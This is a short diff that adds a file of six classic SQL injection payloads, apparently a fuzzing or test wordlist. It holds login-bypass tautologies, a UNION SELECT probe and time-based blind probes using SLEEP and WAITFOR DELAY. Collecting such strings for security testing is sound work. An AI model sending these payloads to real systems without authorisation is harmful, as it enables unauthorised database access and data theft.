@@ -1,0 +1,6 @@
+' OR '1'='1
+" OR ""="
+' OR 1=1--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(5)--
+"; WAITFOR DELAY '0:0:5'--
